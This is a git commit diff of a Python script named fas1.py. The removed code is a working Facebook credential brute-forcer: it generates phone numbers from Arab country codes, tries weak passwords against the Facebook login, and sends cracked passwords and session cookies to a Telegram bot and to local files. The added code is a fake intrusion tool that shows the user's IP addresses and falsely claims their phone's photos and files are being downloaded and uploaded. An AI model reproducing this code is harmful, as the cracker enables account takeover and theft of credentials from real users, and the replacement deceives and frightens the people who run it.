a8275b1643784c67e7db97aff75dddc8c2593490
zanadeza <131504812+zanadeza@users.noreply.github.com>
2025-04-22 12:28:49 +0300

    Update fas1.py

--- fas1.py
+++ fas1.py
@@ -1,374 +1,88 @@
-import webbrowser
-import requests,time,pyfiglet,datetime
-now = datetime.datetime.today()
 
-now = datetime.datetime.today()
-mm = str(now.month)
-dd = str(now.day)
-yyyy = str(now.year)
-hour = str(now.hour)
-mi = str(now.minute)
-ss = str(now.second)
-t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)
-
-
-hours = (now.hour)
-x = datetime.datetime.now()
-g= datetime.datetime(2024, 10, 2, 12, 10 ,9)
-
-
-if (x.strftime("%x"))>(g.strftime("%x")):
- print('\033[1;32m تم ايقاف الاداه راسل المطور نادر لتفعيل ')
- time.sleep(1)
- print('\033[1;31m المطور نادر ')
- time.sleep(1)
- print('\033[1;32m شروحات نادر')
- time.sleep(1)
- print('\033[1;31m 1')
- time.sleep(1)
- print('\033[1;32m 2')
- time.sleep(1)
- print('\033[1;31m 3')
- time.sleep(1)
- print('\033[1;32m 4')
- time.sleep(1)
- print('\033[1;31m 5')
- time.sleep(1)
- print('\033[1;32m 6')
- time.sleep(1)
- print('\033[1;31m 7')
- time.sleep(1)
- print('\033[1;32m 8')
- time.sleep(1)
- print('\033[1;31m 9')
- time.sleep(1)
- print('\033[1;32m@N_0_N_7')
- webbrowser.open('https://t.me/nader20090')
- exit()
- open(".token.txt", "w").write(' . . . .')
- print(x)
-import os,sys,time,json,random,re,string,platform,base64,uuid
-
-os.system("git pull")
-from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoup
-import requests as ress
-from datetime import date
-from datetime import datetime
-from time import sleep
-from time import sleep as waktu
-try:
-    import requests
-    from concurrent.futures import ThreadPoolExecutor as ThreadPool
-    import mechanize
-    from requests.exceptions import ConnectionError
-except ModuleNotFoundError:
-    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
-    os.system('pip install bs4')
-            
-            
-
-class jalan:
-    def __init__(self, z):
-        for e in z + "\n":
-            sys.stdout.write(e)
-            sys.stdout.flush()
-            time.sleep(0.0011)
-            
-ORANGE = '\033[1;35m'
-GREEN = '\033[1;32m'
-WHITE = '\033[1;97m' #
-BLUE = '\033[1;33m'
-print('\033[1;32m ادخل توكن بوتك')
-token=input('\033[1;32m𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧 : ')
+import socket
+import requests
+import time
+import os
+import pyfiglet
+os.system("pip install pyfiglet")
+os.system("pip install requests")
+Z =  '\033[1;32m' #احمر
+logo = pyfiglet.figlet_format('AL.JOKER AHM7D')
+print(Z+logo)
 print('')
-print('\033[1;32m ادخل ايدي بوتك')
-ID=input('\033[1;32m𝐄𝐧𝐭𝐞𝐫 𝐈𝐃  : ')
-YELLOW = '\033[1;33m'
-RED = '\033[1;91m'
-M = '\x1b[1;97m' # PUTIH
-P = '\x1b[1;91m' # MERAH
-K = '\x1b[1;92m' # HIJAU
-H = '\x1b[1;93m' # KUNING
-U = '\x1b[1;94m' # BIRU
-B = '\x1b[1;95m' # UNGU
-N = '\x1b[1;96m' # BIRU MUDA
-O = '\x1b[0m'    # WARNA MATI
-BN = '\x1b[1;90m' # WARNA ABU ABU
-A = '\x1b[1;107m' # BELAKANG PUTIH
-BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
-BP = '\x1b[1;105m' # BELAKANG PINK
-BB = '\x1b[1;104m' # BELAKANG BIRU
-BK = '\x1b[1;103m' # BELAKANG KUNING
-BH = '\x1b[1;102m' # BELAKANG HIJAU
-BM = '\x1b[1;101m' # BELAJANG MERAH
-BA = '\x1b[1;100m' # BELAKANG ABU ABU
-my_color = [
- P, M, H, K, B, U, O, N]
-warna = random.choice(my_color)
-now = datetime.now()
-dt_string = now.strftime("%H:%M")
-current = datetime.now()
-ta = current.year
-bu = current.month
-ha = current.day
-today = date.today()
-logo =                                          ("""
-               \033[1;32m=\033[1;33m=\033[1;31m=\033[1;37m=\033[1;36m=\033[1;35m=\033[1;34m=\033[1;35m=\033[1;32m=\033[1;33m=\033[1;31m=\033[1;37m=\033[1;36m=\033[1;34m=\033[1;35m=\033[1;32m=\033[1;33m=\033[1;31m=\033[1;37m=\033[1;36m=\033[1;34m=\033[1;35m=\033[1;32m=\033[1;33m=\033[1;31m=\033[1;37m=\033[1;36m=\033[1;34m=\033[1;35m=\033[1;32m=
-              \033[1;32m| \033[1;35m[\033[1;36mNADER\033[1;35m]\033[1;33m«\033[1;35m«\033[1;32m«\033[1;37m«\033[1;34m1\033[1;36m»\033[1;31m»\033[1;33m»\033[1;35m»\033[1;37m:\033[1;32m{@N_0_N_7}   \033[1;32m|
-              \033[1;32m| \033[1;35m[\033[1;36mNADER\033[1;35m]\033[1;34m«\033[1;36m«\033[1;31m«\033[1;35m«\033[1;32m2\033[1;37m»\033[1;34m»\033[1;36m»\033[1;31m»\033[1;35m:\033[1;32m{@XK_X5}\033[1;32m|
-              \033[1;32m| \033[1;35m[\033[1;36mtale \033[1;35m]\033[1;35m«\033[1;33m«\033[1;37m«\033[1;34m«\033[1;32m3\033[1;36m»\033[1;31m»\033[1;35m»\033[1;33m»\033[1;37m:\033[1;32m{@nader20090}\033[1;32m|
-               \033[1;32m=\033[1;33m=\033[1;31m=\033[1;37m=\033[1;36m=\033[1;34m=\033[1;35m=\033[1;32m=\033[1;33m=\033[1;31m=\033[1;37m=\033[1;36m=\033[1;34m=\033[1;35m=\033[1;32m=\033[1;33m=\033[1;31m=\033[1;37m=\033[1;36m=\033[1;34m=\033[1;35m=\033[1;32m=\033[1;33m=\033[1;31m=\033[1;37m=\033[1;36m=\033[1;34m=\033[1;35m=\033[1;32m=\033[1;33m=
-""")
-loop = 0
-oks = []
-cps = []
+print('')
 
-def clear():
-    os.system('clear')
-    print(logo)
-from time import localtime as lt
-from os import system as cmd
-ltx = int(lt()[3])
-if ltx > 12:
-    a = ltx-12
-    tag = "PM"
-else:
-    a = ltx
-    tag = "AM"
-    
-    
+
+
+hostname = socket.gethostname()
+local_ip = socket.gethostbyname(hostname)
+print('\033[1;31m= = = = = = = = = = = = = = = = = = = = =')
+print('''
+\033[1;32m
+The link is being sent to you. Please wait. 
+
+''')
+print('\033[1;31m= = = = = = = = = = = = = = = = = = = = =')
+print('\n')
+nader = ('\033[1;35mYES : URL :  https://api.ipify.org')
+
+print(nader)
 try:
-  
-    v = 5.2
-    update = ('5.2')
-    update = ('5.2')
-    if str(v) in update:
-        os.system('clear')
-    else:pass
-except:print('\n\033[1;31m تم التطوير من قبل المطور نادر \033[0;97m')
-#global functions
-def dynamic(text):
-    titik = ['.   ','..  ','... ','.... ']
-    for o in titik:
-        print('\r'+text+o),
-        sys.stdout.flush();time.sleep(1)
+    public_ip = requests.get('https://api.ipify.org').text
+except requests.RequestException:
+    public_ip = "تعذر جلب IP العام. تحقق من الاتصال بالإنترنت."
 
-#User agents
-ugen2=[]
-ugen=[]
- 
-for xd in range(10000):
-    aa='Mozilla/5.0 (Linux; U; Android'
-    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
-    c=' en-us; GT-'
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(1, 999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-    h=random.randrange(73,100)
-    i='0'
-    j=random.randrange(4200,4900)
-    k=random.randrange(40,150)
-    l='Mobile Safari/537.36'
-    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-    ugen.append(uaku2)
-    
-# APK CHECK
-def i():
-    user=[]
-    twf =[]
-    os.getuid
-    os.geteuid
-    os.system("clear")
-    jalan(logo)    
-    jalan("\033[1;36m@N_0_N_7")
-    i  = ('''\033[1;32m+-------------------------------------------------------------+
-\033[1;36mبسم الله الرحمان الرحيم                        
-\033[1;32m+-------------------------------------------------------------+
-\033[1;31mCONTRI×====×>[اداه الدول فرع 2]
 
-\033[1;32m_______________________________________________________________
-\033[1;36m|✓N<العراق>🇮🇶==> (1):  96477  (2):  96478  (3):  96475
+time.sleep(15)
+print(f'''
+\033[1;31m= = = = = = = = = = = = = = = = = = = = =
+\033[1;32mIP INTERNAL :: {local_ip}
 
-\033[1;36m|✓N<سوريا>🇸🇾==> (1):  96393  (2):  96394  (3):  96395
-
-\033[1;35m|✓N<مصر>🇪🇬==> (1): 2010  (2): 2011  (3): 2012  (4): 2015
-
-\033[1;35m|✓N<تركيا>🇹🇳==> (1):  9053
-
-\033[1;34m|✓N<الجزائر>🇩🇿==> (1):  21359  (2):  21355 (3):  21366
-
-\033[1;34m|✓N<الاردن>🇯🇴==> (1):  96278  (2):  96277 (3):  96279
-
-\033[1;33m|✓N<عمان>🇴🇲==> (1):  96824
-
-\033[1;33m|✓N<الكويت>🇯🇴==> (1):  96550
-
-\033[1;32m|✓N<الامارات>🇦🇪==> (1):  97150
-
-\033[1;31m|✓N<ليبيا>🇱🇾==> (1):  218  (2):  21894  (3):  21892
-
-\033[1;31m|✓N<تونس>🇸🇦==> (1):  2162  (2):  2165  (3):  21676
-
-\033[1;36m|✓N<لبنان>🇱🇧==> (1):  96176  (2):  96171  (3):  96170
-
-\033[1;36m|✓N<المغرب>🇲🇦==> (1):  21266  (2):  21261  (3):  2126
-
-\033[1;35m|✓N<السودان>🇰🇼==> (1):  2491  (2):  2499 
-
-\033[1;35m|✓N<اسرائيل>🤮==> (1):  97252
-
-\033[1;34m|✓N<السعوديه>🇸🇦==>(1):  96655  (2):  96658  (3):  96656 
-
-\033[1;34m|✓N<اليمن>🇾🇪==> (1):  96777  (2):  96773  (3):  96771
-
-\033[1;33m|✓N<البحرين>🇰🇼==> (1):  9733
-\033[1;32m_______________________________________________________________''')
-    print(i)
-    code = input('\033[1;32minter the cod :  ')
-    os.system("clear")
-    limit = 50000
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    os.system("clear")
-    print(logo)
-    passx = int('1')
-    HamiiID = []
-    print("")
-    for bilal in range(passx):
-        pww = '١٢٣٤٥٦٧٨٩'
-        HamiiID.append(pww)
-    with ThreadPool(max_workers=50) as manshera:
-        clear()
-        tl = str(len(user))
-        print('\033[1;91m  عدد الايديات المستهدفه: '+tl)
-        print('\033[1;97m شروحات نادر @nader20090')
-        os.system('clear')
-        for love in user:
-            pwx = [love[1:]]
-            uid = code+love
-            for Eman in HamiiID:
-                pwx.append(Eman)
-            manshera.submit(rcrack,uid,pwx,tl)
-    print('\033[1;34m >_@nader20090_<')
-    os.system('clear')
-
-def rcrack(uid,pwx,tl):
-    #print(user)
-    global loop
-    global cps
-    global oks
-    global proxy
-    try:
-        for ps in pwx:
-            pro = random.choice(ugen)
-            session = requests.Session()
-            free_fb = session.get('https://free.facebook.com').text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":ps,
-            "login":"Log In"}
-            header_freefb = {"authority": 'free.facebook.com',
-            "method": 'GET',
-            "scheme": 'https',
-            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
-            "accept-encoding": 'gzip, deflate, br',
-            "accept-language": 'en-US,en;q=1',
-            'cache-control': 'no-cache, no-store, must-revalidate',
-            "referer": 'https://t.facebook.com/',
-            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
-            "sec-ch-ua-mobile": '?1',
-            "sec-ch-ua-platform": "Windows",
-            "sec-fetch-dest": 'document',
-            "sec-fetch-mode": 'navigate',
-            "sec-fetch-site": 'same-origin',
-            "sec-fetch-user": '?0',
-            "pragma": 'no-cache',
-            "priority": 'u=0',
-            'cross-origin-resource-policy': 'cross-origin',
-            "upgrade-insecure-requests": '1',
-            "user-agent": pro}
-            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[7:22]
-                print(f'''
-<><><><><><><><><><><><><><><><><>
-🟢 : OK حساب شغال
-<><><><><><><><><><><><><><><><><>
-🔰 - NUMBE : {uid}
- <><><><><><><><><><><><><><><><><>
-🔰 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {cid}
-<><><><><><><><><><><><><><><><><>
-🔰 - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {ps}
-<><><><><><><><><><><><><><><><><>
-🔰 - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 : {coki}
-<><><><><><><><><><><><><><><><><>
-🗯 - BY : @N_0_N_7
-<><><><><><><><><><><><><><><><><>
-🗯 - TLE : @nader20090
-<><><><><><><><><><><><><><><><><>
-                ''')
-                tlg = (f'''
-<><><><><><><><><><><><><><><><><>
-🟢 : OK حساب شغال
-<><><><><><><><><><><><><><><><><>
-🔰 - NUMBE : {uid}
-<><><><><><><><><><><><><><><><><>
-🔰 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {cid}
-<><><><><><><><><><><><><><><><><>
-🔰 - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {ps}
-<><><><><><><><><><><><><><><><><>
-🔰 - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 : {coki}
-<><><><><><><><><><><><><><><><><>
-🗯 - BY : @N_0_N_7
-<><><><><><><><><><><><><><><><><>
-🗯 - TLE : @nader20090
-<><><><><><><><><><><><><><><><><>
+\033[1;32mIP BASIC ::  {public_ip}
+\033[1;31m= = = = = = = = = = = = = = = = = = = = =
 ''')
 
-                requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg))                
-                cek_apk(session,coki)
-                open('/sdcard/ok.txt', 'a').write( cid+' | '+ps+'\n')
-                oks.append(cid)
-                follow(self, session, coki)
-                break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[24:39]
-                print(f'''
-                <><><><><><><><><><><><><><><><><>
-⛔ : CP حساب سيكور
-<><><><><><><><><><><><><><><><><>
-🔰 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {cid}
-<><><><><><><><><><><><><><><><><>
-🔰 - NUMBE : {uid}
-<><><><><><><><><><><><><><><><><>
-🔰 - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {ps}
-<><><><><><><><><><><><><><><><><>
-🗯 - BY : @N_0_N_7
-<><><><><><><><><><><><><><><><><>
-🗯 - TLE : @nader20090
-<><><><><><><><><><><><><><><><><>''')    
+print('''
+\033[1;32m
+FILE 500 >> Files are being downloaded now. 
 
-                open('/sdcard/cp.txt', 'a').write( cid+' | '+ps+' \n')
-                cps.append(cid)
-                break
-            else:
-                continue
-        loop+=1
-        sys.stdout.write('\r               %s[%s/%s]  [OK NADER:%s]  [CP NADER:%s] \r'%(H,loop,tl,len(oks),len(cps))),
-        sys.stdout.flush()
-    except:
-        pass
+Android 
+DCIM 
+Download 
+Movies
+Music 
+Pictures 
+Screenshot
 
-i()
+''')
+time.sleep(5)
+print('\033[1;32mI AM WAITING >>Please wait while the file is being downloaded. Android')
+folder_name = "Android"
+
+path = "/storage/emulated/0/"  # في حالة كنت على أندروي
+folder_path = os.path.join(path, folder_name)
+
+if not os.path.exists(folder_path):
+    os.makedirs(folder_path)
+    time.sleep(100)
+    print(f"The file was created successfully. Android")
+else:
+    print("The file already exists. ")
+
+
+
+
+    # إنشاء الملف
+    
+    
+    
+    
+    
+time.sleep(5)
+print('''
+
+\033[1;32mThe rest of the required files are now being uploaded. 
+''')
+
+time.sleep(100)
+
